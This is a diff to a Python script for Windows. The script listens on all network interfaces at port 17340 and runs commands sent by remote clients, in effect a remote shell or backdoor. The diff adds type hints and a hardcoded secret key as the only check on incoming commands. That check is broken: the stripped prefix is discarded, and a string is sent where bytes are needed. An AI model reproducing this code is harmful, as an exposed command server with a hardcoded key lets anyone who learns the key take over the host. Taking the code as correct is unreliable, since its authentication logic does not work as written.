@@ -7,11 +7,12 @@ import shutil
 import win32com.client
 # uncomment firstSetup()
 
+privateKey: str = "?!(asLK03,,yB/["
 sys.stderr = sys.stdout
-running = True # running server
-finished = False # finished running commands this session
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-port = 17340
+running: bool = True # running server
+finished: bool = False # finished running commands this session
+sock: socket.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+port: int = 17340
 try:
     sock.bind(("0.0.0.0", port))
 except:
@@ -56,24 +57,28 @@ def clientConnect():
     if running == True:
         clientConnect()
 
-def commandHandler(client):
+def commandHandler(client: socket.socket):
     global finished
     try:
         client.send(("\nCurrent Directory: " + os.getcwd()).encode())
         time.sleep(.25)
         client.send("Command".encode())
-        command = client.recv(1024).decode().strip()
-        if (command == "Finish"):
-            finished = True
-        if (not finished):
-            runCommand(command, client)
-            if (running):
-                commandHandler(client)
+        command: str = client.recv(1024).decode().strip()
+        if (command.startswith(privateKey)):
+            command.removeprefix(privateKey)
+            if (command == "Finish"):
+                finished = True
+            if (not finished):
+                runCommand(command, client)
+                if (running):
+                    commandHandler(client)
+        else:
+            client.send("Invalid Key")
     except:
         print("Connection Interrupted")
         pass
 
-def runCommand(command: str, client):
+def runCommand(command: str, client: socket.socket):
     global running
     global finished
     if ("cd " in command):
